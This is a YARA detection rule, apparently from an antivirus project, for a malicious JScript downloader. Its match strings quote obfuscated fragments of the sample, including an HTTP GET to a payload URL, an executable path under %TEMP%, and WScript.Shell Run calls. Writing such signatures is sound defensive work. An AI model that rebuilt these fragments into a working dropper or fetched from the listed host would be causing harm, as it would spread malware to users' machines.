rule sig_20160401_d81e66210ba0fc549d54549fdeb899bf {
  meta:
    description = "datamaliciousorder - file 20160401_d81e66210ba0fc549d54549fdeb899bf.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ac5adf9b29dff381a05a347d517de5494227a0ebbf04c607ab0ca1d6994fbe9b"

  strings:
    $s1  = "ZtjNd[MgqQjg](\"G\" + \"ET\", \"http://ledivinecomedie.com/m9woq\", false);" fullword ascii
    $s2  = "function BldSpg(GpEo, IumBh){IgGf = IgGf * 1; return GpEo - IumBh;};" fullword ascii
    $s3  = "var LrChm = function YxvMk() {return WScript[MgvMo](\"WScript\"+\".Shell\");}(), ZlHt = 11;" fullword ascii
    $s4  = "if (ZtjNd[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function BnqWam() {return LrChm[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Lz4vwEAtSIv6Gu.ex\" + \"e\";};" fullword ascii
    $s6  = "function NcZp(){return NfoXp + \"\";};" fullword ascii
    $s7  = "function GnuJa() {return ((ZiWid == true) && (ZiWid == PkPu)) ? 1 : IgGf;};" fullword ascii
    $s8  = "var OzkDo = new this[\"Date\"]();" fullword ascii
    $s9  = "var BqaVl = false;" fullword ascii
    $s10 = "var ZiWid = false;" fullword ascii
    $s11 = "PkPu = true; " fullword ascii
    $s12 = "ZiWid = true; " fullword ascii
    $s13 = "function ImjNf(){return 23;};" fullword ascii
    $s14 = "return BldSpg(QlaSxb, AuIe);" fullword ascii
    $s15 = "var PkPu = false;" fullword ascii
    $s16 = "function LmZr(ErwUns) {var DwWqy = (1, 2, 3, 4, 5, ErwUns); return DwWqy;};" fullword ascii
    $s17 = "function NfZl(){return MgvMo;};" fullword ascii
    $s18 = "}while (EwMu);" fullword ascii
    $s19 = "function ZyLo()" fullword ascii
    $s20 = "function CaDw(EpEf){LrChm[\"R\"+\"un\"](EpEf, IgGf, IgGf);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}